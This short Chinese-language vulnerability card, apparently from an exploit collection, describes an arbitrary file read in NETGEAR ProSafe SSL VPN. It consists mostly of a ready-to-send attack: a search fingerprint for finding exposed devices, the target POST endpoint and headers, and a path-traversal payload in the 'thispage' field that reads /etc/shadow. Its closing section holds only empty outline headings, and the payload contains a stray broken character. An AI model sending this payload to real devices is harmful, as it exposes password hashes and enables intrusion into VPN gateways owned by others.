# NETGEARProSafeSSLVPN任意文件读取漏洞

- **系统**：NETGEARProSafeSSLVPN　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="NETGEAR ProSAFE"`
- **请求**：`POST /scgi-bin/platform.cgi HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 218`

**请求体 / payload**
```
thispage=../../../../../../../../../../../../../../../../etc/shadow�&USERDBUsers.UserName=CFTg&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login&Login.userAgent=xlLc
```

**其他**
- NETGEAR ProSafe SSL VPN 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * NETGEAR ProSafe SSL VPN